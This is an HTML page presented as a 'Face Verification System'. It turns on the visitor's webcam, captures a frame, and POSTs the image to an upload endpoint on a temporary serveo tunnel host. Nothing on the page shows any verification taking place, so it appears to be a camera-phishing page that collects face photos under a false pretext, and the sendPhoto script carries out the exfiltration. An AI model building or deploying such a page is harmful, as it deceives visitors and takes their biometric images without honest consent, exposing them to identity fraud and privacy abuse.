<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Face Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: auto;
        }
        video {
            border: 3px solid #4CAF50;
            border-radius: 10px;
            width: 100%;
            background: black;
        }
        button {
            padding: 15px 30px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            margin: 10px;
            cursor: pointer;
        }
        #status {
            padding: 15px;
            margin: 15px;
            border-radius: 8px;
            background: #e8f5e9;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Face Verification System</h2>
        <p>Allow camera access to continue</p>
        
        <div id="status">Status: Ready</div>
        
        <video id="video" autoplay playsinline></video>
        <br>
        
        <button onclick="startCamera()">Enable Camera</button>
        <button onclick="sendPhoto()" id="sendBtn" disabled>Send Test Photo</button>
    </div>
    
    <script>
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        const sendBtn = document.getElementById('sendBtn');
        let stream = null;
        
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                video.srcObject = stream;
                status.innerHTML = "✅ Camera activated";
                status.style.background = "#c8e6c9";
                sendBtn.disabled = false;
                
            } catch(err) {
                status.innerHTML = "❌ Error: " + err.message;
                status.style.background = "#ffcdd2";
            }
        }
        
        function sendPhoto() {
            if (!stream) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                fetch('https://dde8812935480088-5-211-50-247.serveousercontent.com/upload', {
                    method: 'POST',
                    body: blob
                })
                .then(() => alert('Photo sent!'))
                .catch(err => console.error(err));
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
